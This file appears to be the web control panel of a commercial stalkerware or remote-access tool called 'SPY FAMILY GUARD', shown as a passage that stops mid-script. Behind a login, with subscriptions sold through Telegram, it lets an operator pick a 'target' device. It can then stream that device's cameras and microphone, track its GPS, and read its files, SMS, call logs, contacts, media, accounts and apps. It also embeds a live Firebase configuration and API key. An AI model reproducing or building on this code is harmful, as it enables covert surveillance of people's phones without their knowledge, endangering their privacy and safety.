<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>SPY FAMILY GUARD | Secure Dashboard</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <style>
        :root {
            --sidebar-bg: #0F172A;
            --main-bg: #F1F5F9;
            --primary: #2563EB;
            --danger: #F43F5E;
            --success: #10B981;
            --border: #E2E8F0;
            --text-main: #1E293B;
            --text-muted: #64748B;
            --card-bg: #FFFFFF;
            --accent: #F43F5E;
            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body.dark {
            --sidebar-bg: #020617;
            --main-bg: #0F172A;
            --card-bg: #1E293B;
            --text-main: #F1F5F9;
            --text-muted: #94A3B8;
            --border: #334155;
        }


        body {
            margin: 0;
            font-family: 'Inter', -apple-system, sans-serif;
            display: flex;
            height: 100vh;
            background-color: var(--main-bg);
            overflow: hidden;
            color: var(--text-main);
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            color: var(--text-main);
        }

        strong,
        b {
            color: var(--text-main);
        }


        /* Sidebar Styles */
        .sidebar {
            width: 260px;
            background-color: var(--sidebar-bg);
            color: #CBD5E1;
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
            transition: transform 0.3s ease;
            z-index: 1000;
            height: 100vh;
            position: fixed;
            box-shadow: 4px 0 10px rgba(0, 0, 0, 0.1);
        }

        .sidebar-header {
            padding: 25px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        #device-selector {
            width: 100%;
            padding: 12px;
            background: #1E293B;
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            margin-top: 15px;
            cursor: pointer;
            outline: none;
            appearance: none;
            transition: var(--transition);
        }

        #device-selector:hover {
            border-color: var(--primary);
        }

        .nav-group {
            padding: 15px 0;
            flex-grow: 1;
            overflow-y: auto;
        }

        .nav-item {
            padding: 12px 24px;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: var(--transition);
            font-size: 0.9rem;
            font-weight: 600;
            border-left: 4px solid transparent;
            color: #94A3B8;
            gap: 12px;
        }

        .nav-item:hover {
            background: rgba(255, 255, 255, 0.03);
            color: white;
            padding-left: 28px;
        }

        .nav-item.active {
            background: rgba(37, 99, 235, 0.12);
            color: white;
            border-left-color: var(--primary);
        }

        .nav-item:active {
            transform: scale(0.98);
        }

        /* Content Area */
        .main-content {
            flex-grow: 1;
            margin-left: 260px;
            display: flex;
            flex-direction: column;
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            position: relative;
            background-color: var(--main-bg);
            transition: var(--transition);
        }

        .content-body {
            flex-grow: 1;
            padding: 25px;
            overflow-y: auto;
        }

        .mobile-header {
            display: none;
            background: var(--sidebar-bg);
            color: white;
            padding: 15px 20px;
            align-items: center;
            justify-content: space-between;
            z-index: 1001;
        }

        .page {
            display: none;
            width: 100%;
        }

        .page.active {
            display: block;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .card {
            background: var(--card-bg);
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
            margin-bottom: 20px;
            border: 1px solid var(--border);
            transition: var(--transition);
            width: 100%;
            box-sizing: border-box;
            overflow: hidden;
        }



        .card:hover {
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 700;
            font-size: 0.85rem;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: var(--transition);
        }

        .btn:hover {
            filter: brightness(1.1);
            transform: translateY(-1px);
        }

        .btn:active {
            transform: scale(0.95);
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        /* Camera View Fix */
        #stream-img {
            width: 100%;
            max-width: 900px;
            height: auto;
            border-radius: 15px;
            background: #000;
            display: block;
            margin: 0 auto;
            min-height: 250px;
            object-fit: contain;
            border: 4px solid #fff;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        /* Mic LIVE Section */
        .mic-live-card {
            border: 2px solid var(--danger);
            background: rgba(244, 63, 94, 0.05);
            border-radius: 25px;
            padding: 30px;
            text-align: center;
            margin-bottom: 20px;
            color: var(--text-main);
        }


        .mic-icon {
            font-size: 3.5rem;
            color: #2563EB;
            margin-bottom: 10px;
            transition: var(--transition);
        }

        /* Modern Voice Wave Animation */
        .voice-wave {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
            height: 60px;
            margin-bottom: 20px;
            display: none;
        }

        .voice-wave.active {
            display: flex;
        }

        .wave-bar {
            width: 4px;
            height: 10px;
            background: var(--primary);
            border-radius: 4px;
            animation: waveAnim 1s ease-in-out infinite;
        }

        .wave-bar:nth-child(2) {
            animation-delay: 0.1s;
            height: 20px;
        }

        .wave-bar:nth-child(3) {
            animation-delay: 0.2s;
            height: 40px;
        }

        .wave-bar:nth-child(4) {
            animation-delay: 0.3s;
            height: 25px;
        }

        .wave-bar:nth-child(5) {
            animation-delay: 0.4s;
            height: 45px;
        }

        .wave-bar:nth-child(6) {
            animation-delay: 0.5s;
            height: 30px;
        }

        .wave-bar:nth-child(7) {
            animation-delay: 0.6s;
            height: 20px;
        }

        @keyframes waveAnim {

            0%,
            100% {
                height: 10px;
                opacity: 0.5;
            }

            50% {
                height: 50px;
                opacity: 1;
            }
        }

        .mic-status-text {
            font-weight: 900;
            font-size: 1.2rem;
            color: #1E293B;
            margin-bottom: 10px;
        }


        .mic-controls {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 25px;
        }

        .btn-mic {
            width: 100px;
            padding: 12px;
            border-radius: 12px;
            border: 2px solid var(--sidebar-bg);
            font-weight: 900;
            cursor: pointer;
            background: var(--card-bg);
            color: var(--text-main);
            transition: var(--transition);
        }

        .btn-mic:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            background: var(--main-bg);
        }

        .btn-mic.active {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }


        #visualizer {
            width: 100%;
            height: 120px;
            background: transparent;
            border-radius: 15px;
        }

        .status-badge {
            padding: 6px 14px;
            border-radius: 99px;
            font-size: 0.75rem;
            font-weight: 900;
            transition: var(--transition);
        }

        .online {
            background: #D1FAE5;
            color: #065F46;
            box-shadow: 0 0 10px rgba(16, 185, 129, 0.2);
        }

        .offline {
            background: #FEE2E2;
            color: #991B1B;
        }

        /* Map Styles */
        #gps-map {
            height: 500px;
            width: 100%;
            border-radius: 20px;
            border: 4px solid white;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            z-index: 1;
        }

        @media (max-width: 768px) {
            .sidebar {
                left: -260px;
                transform: translateX(0);
                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            }

            .sidebar.open {
                transform: translateX(260px);
            }

            .main-content {
                margin-left: 0;
                padding: 10px;
                width: 100%;
                box-sizing: border-box;
            }

            .mobile-header {
                display: flex;
            }

            .content-body {
                padding: 10px;
                overflow-x: hidden;
            }

            .sidebar-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.5);
                z-index: 999;
                backdrop-filter: blur(4px);
                display: none;
                opacity: 0;
                transition: opacity 0.3s;
            }

            .sidebar-overlay.show {
                display: block;
                opacity: 1;
            }

            #gps-map {
                height: 300px;
            }

            .card {
                padding: 15px;
                border-radius: 15px;
                margin-bottom: 15px;
            }

            .quality-control {
                max-width: 100%;
            }

            .btn-mic {
                width: 45%;
                padding: 15px;
                font-size: 1rem;
            }

            .flex-mobile-stack {
                flex-direction: column !important;
                gap: 10px !important;
            }

            .flex-mobile-stack>* {
                width: 100% !important;
                flex: none !important;
            }

            .btn {
                padding: 12px 18px;
                font-size: 0.95rem;
                width: 100%;
            }

            .nav-item {
                padding: 15px 24px;
                font-size: 1rem;
            }
        }



        #media-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 2000;
            display: none;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        .modal-content {
            max-width: 95%;
            max-height: 90%;
            text-align: center;
            animation: zoomIn 0.3s ease;
        }

        @keyframes zoomIn {
            from {
                transform: scale(0.9);
                opacity: 0;
            }

            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        .modal-content img,
        .modal-content video {
            max-width: 100%;
            max-height: 80vh;
            border-radius: 10px;
        }

        .table-container {
            width: 100%;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            border-radius: 15px;
            border: 1px solid var(--border);
            background: transparent;
        }



        .list-table {
            width: 100%;
            border-collapse: collapse;
            min-width: 500px;
        }

        .list-table th,
        .list-table td {
            padding: 15px;
            text-align: left;
            font-size: 0.9rem;
            border-bottom: 1px solid var(--border);
            color: var(--text-main);
            background: transparent;
        }

        .list-table th {
            background: rgba(0, 0, 0, 0.02);
            font-weight: 700;
            color: var(--text-muted);
        }

        body.dark .list-table th {
            background: rgba(255, 255, 255, 0.05);
        }

        .list-table tr:hover {
            background: rgba(0, 0, 0, 0.01);
        }

        body.dark .list-table tr:hover {
            background: rgba(255, 255, 255, 0.02);
        }


        /* Premium Slider Styles */
        .quality-control {
            background: var(--main-bg);
            padding: 15px;
            border-radius: 12px;
            border: 1px solid var(--border);
            margin-top: 10px;
            width: 100%;
            max-width: 300px;
            color: var(--text-main);
        }

        input[type=range] {
            -webkit-appearance: none;
            appearance: none;
            width: 100%;
            background: transparent;
        }

        input[type=range]:focus {
            outline: none;
        }

        input[type=range]::-webkit-slider-runnable-track {
            width: 100%;
            height: 6px;
            cursor: pointer;
            background: var(--border);
            border-radius: 3px;
        }

        input[type=range]::-webkit-slider-thumb {
            height: 18px;
            width: 18px;
            border-radius: 50%;
            background: var(--primary);
            cursor: pointer;
            -webkit-appearance: none;
            margin-top: -6px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }

        .preset-btns {
            display: flex;
            gap: 5px;
            margin-bottom: 10px;
        }

        /* Luxury Login Page Styles */
        #auth-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, #1E293B, #020617);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 30px;
            padding: 50px 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .login-logo {
            width: 70px;
            height: 70px;
            background: var(--accent);
            border-radius: 20px;
            display: grid;
            place-items: center;
            margin: 0 auto 25px;
            font-size: 2rem;
            color: white;
            box-shadow: 0 10px 20px rgba(244, 63, 94, 0.3);
        }

        .login-field {
            width: 100%;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            margin-bottom: 20px;
            color: white;
            outline: none;
            transition: var(--transition);
            text-align: center;
        }

        .login-field:focus {
            border-color: var(--primary);
            background: rgba(255, 255, 255, 0.08);
        }

        .login-btn {
            flex: 2;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 15px;
            padding: 16px;
            font-weight: 900;
            cursor: pointer;
            transition: var(--transition);
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .tg-btn {
            flex: 1;
            background: #229ED9;
            color: white;
            border: none;
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            font-size: 1.2rem;
            transition: var(--transition);
        }

        .tg-btn:hover {
            background: #24A1DE;
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(34, 158, 217, 0.3);
        }



        .login-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(37, 99, 235, 0.4);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        #auth-error {
            color: var(--danger);
            font-size: 0.8rem;
            margin-top: 15px;
            display: none;
            background: rgba(244, 63, 94, 0.1);
            padding: 10px;
            border-radius: 8px;
            border: 1px solid rgba(244, 63, 94, 0.2);
        }
    </style>
</head>

<body>

    <div class="sidebar-overlay" onclick="toggleSidebar()"></div>

    <div id="media-modal">
        <div class="modal-content">
            <i class="fas fa-times"
                style="float:right; color:white; font-size:1.5rem; cursor:pointer; margin-bottom:10px;"
                onclick="closeModal()"></i>
            <div id="media-container"></div>
            <div id="media-info" style="color:white; margin-top:15px; font-weight:700;"></div>
        </div>
    </div>

    <div id="auth-overlay">
        <div class="login-card">
            <div class="login-logo"><i class="fas fa-shield-virus"></i></div>
            <h2 style="color: white; margin: 0 0 5px; font-size: 1.8rem; font-weight: 900;">SPY GUARD</h2>
            <p style="color: #94A3B8; margin-bottom: 35px; font-size: 0.9rem; letter-spacing: 2px;">SECURE DASHBOARD
                CONTROL</p>
            <input type="email" id="auth-email" class="login-field" placeholder="Admin Email">
            <input type="password" id="auth-pass" class="login-field" placeholder="Access Password">
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <button id="login-btn-el" class="login-btn" onclick="handleAuth()">
                    <div id="login-spinner" class="spinner"></div>
                    <span id="login-btn-text">LOGIN</span>
                </button>
                <a href="https://t.me/spyfamilyguard" target="_blank" class="tg-btn" title="Buy Subscription">
                    <i class="fab fa-telegram-plane"></i>
                </a>
            </div>
            <div id="auth-error"></div>

            <p style="color: #64748B; margin-top: 25px; font-size: 0.75rem;">AUTHORIZATION REQUIRED. ALL SESSIONS ARE
                LOGGED.</p>
        </div>
    </div>


    <div class="mobile-header">
        <div onclick="toggleSidebar()"><i class="fas fa-bars"></i></div>
        <div style="font-weight: 900;">SPY GUARD</div>
        <div id="m-status-tag" class="status-badge offline">OFFLINE</div>
    </div>

    <div class="sidebar">
        <div class="sidebar-header">
            <div style="display: flex; align-items: center; gap: 12px;">
                <div
                    style="width: 35px; height: 35px; background: var(--accent); border-radius: 10px; display: grid; place-items: center;">
                    <i class="fas fa-user-ninja" style="color: white;"></i>
                </div>
                <h2 style="font-size: 1.1rem; margin:0; color:white; font-weight: 900;">SPY GUARD</h2>
            </div>
            <select id="device-selector"></select>
        </div>

        <div class="nav-group">
            <div class="nav-item active" data-page="dashboard" onclick="showPage('dashboard')"><i
                    class="fas fa-desktop"></i> Terminal</div>
            <div class="nav-item" data-page="stats" onclick="showPage('stats')"><i class="fas fa-chart-line"></i>
                Analytics</div>
            <div class="nav-item" data-page="remote" onclick="showPage('remote')"><i class="fas fa-hammer"></i> Actions
            </div>
            <div class="nav-item" data-page="gps" onclick="showPage('gps')"><i class="fas fa-location-dot"></i> GPS
                Tracking</div>
            <div class="nav-item" data-page="files" onclick="showPage('files')"><i class="fas fa-folder-open"></i> File
                Manager</div>
            <div class="nav-item" data-page="notifications" onclick="showPage('notifications')"><i
                    class="fas fa-bell"></i> Notifications</div>
            <div class="nav-item" data-page="messages" onclick="showPage('messages')"><i class="fas fa-envelope"></i>
                SMS</div>
            <div class="nav-item" data-page="calls" onclick="showPage('calls')"><i class="fas fa-phone"></i> Calls</div>
            <div class="nav-item" data-page="contacts" onclick="showPage('contacts')"><i
                    class="fas fa-address-book"></i> Contacts</div>
            <div class="nav-item" data-page="gallery" onclick="showPage('gallery')"><i class="fas fa-images"></i> Media
            </div>
            <div class="nav-item" data-page="accounts" onclick="showPage('accounts')"><i class="fas fa-user-circle"></i> Accounts</div>
            <div class="nav-item" data-page="apps" onclick="showPage('apps')"><i class="fas fa-cubes"></i> Apps</div>
        </div>




        <div class="sidebar-footer" style="padding: 20px; border-top: 1px solid rgba(255,255,255,0.05);">
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <button class="btn" style="flex:1; background: rgba(255,255,255,0.05); color: white;"
                    onclick="toggleDarkMode()"><i class="fas fa-moon"></i></button>
                <button class="btn" style="flex:1; background: rgba(255,255,255,0.05); color: white;"
                    onclick="location.reload()"><i class="fas fa-right-from-bracket"></i></button>
            </div>
            <button class="btn" style="width:100%; background: rgba(244,63,94,0.1); color: var(--danger);"
                onclick="auth.signOut()">LOGOUT</button>

        </div>

    </div>

    <div class="main-content">
        <div class="content-body">
            <div class="header-bar"
                style="display:flex; justify-content:space-between; align-items:center; margin-bottom:25px;">
                <div>
                    <h1 id="dev-name" style="margin:0; font-size: 1.6rem; font-weight: 900;">Dashboard</h1>
                    <div id="health-bar"
                        style="font-size: 0.85rem; color: var(--text-muted); margin-top: 6px; display: flex; gap: 15px;">
                    </div>
                </div>
                <div id="status-tag" class="status-badge offline">OFFLINE</div>
            </div>

            <!-- TABS -->
            <div id="page-dashboard" class="page active">
                <div class="card">
                    <div
                        style="display:flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 15px; margin-bottom: 15px;">
                        <div>
                            <h3 style="margin:0;">Live Link</h3>
                            <div class="quality-control">
                                <div
                                    style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 8px;">
                                    <span style="font-size: 0.8rem; font-weight:700;">Quality: <span
                                            id="q-val">60</span>%</span>
                                    <div class="preset-btns">
                                        <button class="btn btn-primary btn-small" onclick="setQ(20)">LOW</button>
                                        <button class="btn btn-primary btn-small" onclick="setQ(50)">MED</button>
                                        <button class="btn btn-primary btn-small" onclick="setQ(100)">MAX</button>
                                    </div>
                                </div>
                                <input type="range" id="camera-quality" min="1" max="100" value="60"
                                    oninput="document.getElementById('q-val').innerText = this.value">
                            </div>
                        </div>

                        <div style="display:flex; gap:8px; flex-wrap: wrap; width: 100%;">
                            <button class="btn btn-primary" style="flex:1;" onclick="toggleStream('back')">Rear</button>
                            <button class="btn btn-primary" style="flex:1;"
                                onclick="toggleStream('front')">Front</button>
                            <button class="btn btn-danger" style="flex:1;" onclick="stopStream()">Stop</button>
                        </div>

                    </div>
                    <img id="stream-img" src="" alt="Live link standby...">
                </div>
            </div>

            <div id="page-stats" class="page">
                <div class="card">
                    <h3 style="margin:0 0 15px;">Device Info & Stats</h3>
                    <div id="detailed-stats"
                        style="display:grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap:15px;">
                        <div
                            style="padding:20px; background:rgba(37,99,235,0.05); border-radius:12px; text-align:center;">
                            <div style="color:var(--text-muted); font-size:0.9rem; margin-bottom:5px;"><i
                                    class="fas fa-microchip"></i> CPU Usage</div>
                            <div style="font-weight:900; font-size:1.5rem; color:var(--primary);" id="cpu-val">--%</div>
                        </div>
                        <div
                            style="padding:20px; background:rgba(16,185,129,0.05); border-radius:12px; text-align:center;">
                            <div style="color:var(--text-muted); font-size:0.9rem; margin-bottom:5px;"><i
                                    class="fas fa-memory"></i> RAM Free</div>
                            <div style="font-weight:900; font-size:1.5rem; color:var(--success);" id="ram-val">-- MB
                            </div>
                        </div>
                    </div>
                </div>
                <div class="card">
                    <h4 style="margin:0 0 20px;">System Activity History (24h)</h4>
                    <div style="height:200px; display:flex; align-items:flex-end; gap:6px; padding-top:20px; border-bottom: 2px solid var(--border);"
                        id="activity-chart">
                        <!-- Bars will be added by JS -->
                    </div>
                    <div
                        style="display:flex; justify-content:space-between; margin-top:10px; font-size:0.75rem; color:var(--text-muted);">
                        <span>24h ago</span>
                        <span>Now</span>
                    </div>
                </div>
            </div>


            <div id="page-remote" class="page">
                <div class="mic-live-card">
                    <div id="voice-wave-container" class="voice-wave">
                        <div class="wave-bar"></div>
                        <div class="wave-bar"></div>
                        <div class="wave-bar"></div>
                        <div class="wave-bar"></div>
                        <div class="wave-bar"></div>
                        <div class="wave-bar"></div>
                        <div class="wave-bar"></div>
                    </div>
                    <i id="main-mic-icon" class="fas fa-microphone mic-icon"></i>
                    <div class="mic-status-text">Mic: <span id="mic-text">OFF</span></div>

                    <div class="mic-controls">
                        <button class="btn-mic" id="btn-on" onclick="toggleMic(true)">ON</button>
                        <button class="btn-mic active" id="btn-off" onclick="toggleMic(false)">OFF</button>
                    </div>
                    <canvas id="visualizer"></canvas>
                </div>
                <div class="card">
                    <h3 style="margin:0 0 15px;">Remote Messenger</h3>
                    <div class="flex-mobile-stack" style="display:flex; gap:10px;">
                        <input type="text" id="notif-title" placeholder="Title"
                            style="flex:1; padding:12px; border-radius:10px; border:1px solid var(--border); background:var(--main-bg); color:var(--text-main); font-size: 16px;">
                        <input type="text" id="notif-body" placeholder="Message content..."
                            style="flex:2; padding:12px; border-radius:10px; border:1px solid var(--border); background:var(--main-bg); color:var(--text-main); font-size: 16px;">
                        <button class="btn btn-primary" onclick="sendRemoteNotif()"><i class="fas fa-paper-plane"></i>
                            SEND</button>
                    </div>

                </div>
                <div class="card"
                    style="display:grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap:15px;">
                    <div class="btn btn-primary" onclick="sendCommand('ring', true)"><i class="fas fa-bell"></i> Alarm
                    </div>
                    <div class="btn btn-primary" onclick="syncAll()"><i class="fas fa-sync"></i> Sync All</div>
                </div>

            </div>

            <div id="page-gps" class="page">
                <div class="card">
                    <div
                        style="display:flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <h3 style="margin:0;">Device Location</h3>
                        <button class="btn btn-primary" onclick="sendCommand('getGPS', true)"><i
                                class="fas fa-location-arrow"></i> Update Location</button>
                    </div>
                    <div id="gps-map"></div>
                    <div id="location-info" style="margin-top: 15px; font-size: 0.9rem; color: var(--text-muted);">
                        <b>Latitude:</b> <span id="lat">--</span> | <b>Longitude:</b> <span id="lng">--</span> | <b>Last
                            Updated:</b> <span id="loc-time">--</span>
                    </div>
                </div>
            </div>

            <div id="page-files" class="page">
                <div class="card">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                        <h3 style="margin:0;">File Explorer</h3>
                        <button class="btn btn-primary" onclick="goBackDir()"><i class="fas fa-arrow-left"></i>
                            UP</button>
                    </div>
                    <div id="current-path" style="font-size:0.8rem; color:var(--text-muted); margin-bottom:10px;">Root
                    </div>
                    <div class="table-container" id="file-list"></div>
                </div>
            </div>
            <div id="page-notifications" class="page">
                <div class="card">
                    <h3 style="margin:0 0 15px;">Live Notifications</h3>
                    <div class="table-container" id="notif-list"></div>
                </div>
            </div>
            <div id="page-messages" class="page">
                <div class="card">
                    <h3 style="margin:0 0 15px;">SMS Logs</h3>
                    <div class="table-container" id="sms-list"></div>
                </div>
            </div>
            <div id="page-calls" class="page">
                <div class="card">
                    <h3 style="margin:0 0 15px;">Call Logs</h3>
                    <div class="table-container" id="call-list"></div>
                </div>
            </div>
            <div id="page-contacts" class="page">
                <div class="card">
                    <h3 style="margin:0 0 15px;">Contacts</h3>
                    <div class="table-container" id="contact-list"></div>
                </div>
            </div>
            <div id="page-gallery" class="page">
                <div class="card">
                    <h3 style="margin:0 0 15px;">Media Gallery</h3>
                    <div class="table-container" id="gallery-list"></div>
                </div>
            </div>
            <div id="page-accounts" class="page">
                <div class="card">
                    <h3 style="margin:0 0 15px;">User Accounts</h3>
                    <div class="table-container" id="account-list"></div>
                </div>
            </div>
            <div id="page-apps" class="page">
                <div class="card">
                    <h3 style="margin:0 0 15px;">Installed Apps</h3>
                    <div class="table-container" id="app-list"></div>
                </div>
            </div>


        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCL7xPzTETS-BbKNJu3Q7yu3kMFVGqAX90",
            authDomain: "test-web2-57cbb.firebaseapp.com",
            projectId: "test-web2-57cbb",
            storageBucket: "test-web2-57cbb.firebasestorage.app",
            messagingSenderId: "170501005566",
            appId: "1:170501005566:android:afa8273d5916b67ccac5af",
            databaseURL: "https://test-web2-57cbb-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const auth = firebase.auth();

        let currentId = ""; let map; let marker; let activeRefs = [];
        let audioContext; let nextStartTime = 0; let analyser; let dataArray; let canvasCtx;
        let currentFilePath = "/storage/emulated/0";

        function toggleDarkMode() {
            document.body.classList.toggle('dark');
            localStorage.setItem('spyGuardDark', document.body.classList.contains('dark'));
        }
        if (localStorage.getItem('spyGuardDark') === 'true') document.body.classList.add('dark');

        function toggleSidebar() { document.querySelector('.sidebar').classList.toggle('open'); document.querySelector('.sidebar-overlay').classList.toggle('show'); }

        function showPage(pId) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(i => {
                i.classList.remove('active');
                if (i.getAttribute('data-page') === pId) i.classList.add('active');
            });

            const targetPage = document.getElementById(`page-${pId}`);
            if (targetPage) targetPage.classList.add('active');

            if (pId === 'gps') {
                setTimeout(() => {
                    if (!map) {
                        map = L.map('gps-map').setView([0, 0], 2);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                        marker = L.marker([0, 0]).addTo(map);
                    }
                    map.invalidateSize();
                }, 400);
            }

            if (pId === 'files') {
                setTimeout(() => { fetchFiles(currentFilePath); }, 400);
            }

            if (window.innerWidth <= 768) {
                document.querySelector('.sidebar').classList.remove('open');
                document.querySelector('.sidebar-overlay').classList.remove('show');
            }
        }


        auth.onAuthStateChanged(user => {
            if (user) {
                document.getElementById('auth-overlay').style.display = 'none';
                document.querySelector('.sidebar').style.display = 'flex';
                document.querySelector('.main-content').style.display = 'flex';
                loadAllDevices();
            } else {
                document.getElementById('auth-overlay').style.display = 'flex';
                document.querySelector('.sidebar').style.display = 'none';
                document.querySelector('.main-content').style.display = 'none';
            }
        });

        function loadAllDevices() {
            db.ref('devices').on('value', s => {
                const sel = document.getElementById('device-selector');
                const devices = s.val() || {};
                const curSelection = sel.value;
                sel.innerHTML = '<option value="">Select Target...</option>';
                for (let id in devices) {
                    const opt = document.createElement('option');
                    opt.value = id;
                    const status = devices[id].health?.online ? " (Online)" : " (Offline)";
                    opt.innerText = (devices[id].info?.model || id) + status;
                    sel.appendChild(opt);
                }
                if (curSelection) sel.value = curSelection;
            });
        }

        document.getElementById('device-selector').onchange = (e) => { if (e.target.value) { currentId = e.target.value; stopAll(); loadDevice(currentId); } };
        function stopAll() { activeRefs.forEach(r => r.off()); activeRefs = []; }

        function initAudio() {
            if (!audioContext) {
                audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
                analyser = audioContext.createAnalyser();
                analyser.fftSize = 256;
                analyser.connect(audioContext.destination);
                dataArray = new Uint8Array(analyser.frequencyBinCount);
                const vis = document.getElementById('visualizer');
                if (vis) canvasCtx = vis.getContext('2d');
                draw();
            }
            if (audioContext.state === 'suspended') {
                audioContext.resume().then(() => console.log("AudioContext Resumed"));
            }
        }

        function draw() {
            requestAnimationFrame(draw);
            analyser.getByteTimeDomainData(dataArray);
            canvasCtx.clearRect(0, 0, 300, 120); canvasCtx.lineWidth = 3; canvasCtx.strokeStyle = '#2563EB'; canvasCtx.beginPath();
            let sliceWidth = 300.0 / analyser.frequencyBinCount; let x = 0;
            for (let i = 0; i < analyser.frequencyBinCount; i++) {
                let v = dataArray[i] / 128.0; let y = v * 60;
                if (i === 0) canvasCtx.moveTo(x, y); else canvasCtx.lineTo(x, y);
                x += sliceWidth;
            }
            canvasCtx.stroke();
        }

        function playPCM(base64) {
            if (!base64) return;
            initAudio();
            try {
                const binary = atob(base64);
                const bytes = new Int16Array(binary.length / 2);
                for (let i = 0; i < binary.length; i += 2) {
                    bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
                }
                const floatData = new Float32Array(bytes.length);
                for (let i = 0; i < bytes.length; i++) {
                    floatData[i] = bytes[i] / 32768.0;
                }
                const buffer = audioContext.createBuffer(1, floatData.length, 16000);
                buffer.copyToChannel(floatData, 0);
                const source = audioContext.createBufferSource();
                source.buffer = buffer;
                source.connect(analyser);

                // Latency sync: if we are too far behind or ahead, reset timing
                const now = audioContext.currentTime;
                if (nextStartTime < now || nextStartTime > now + 1) {
                    nextStartTime = now + 0.1;
                }

                source.start(nextStartTime);
                nextStartTime += buffer.duration;
            } catch (e) { console.error("PCM Play Error:", e); }
        }

        function loadDevice(id) {
            currentFilePath = "/storage/emulated/0";
            const base = `devices/${id}/`;
            const hR = db.ref(base + 'health'); activeRefs.push(hR);
            hR.on('value', s => {
                const h = s.val() || {};
                const tag = document.getElementById('status-tag');
                const mTag = document.getElementById('m-status-tag');
                const statusStr = h.online ? 'ONLINE' : 'OFFLINE';
                const statusCls = h.online ? 'status-badge online' : 'status-badge offline';
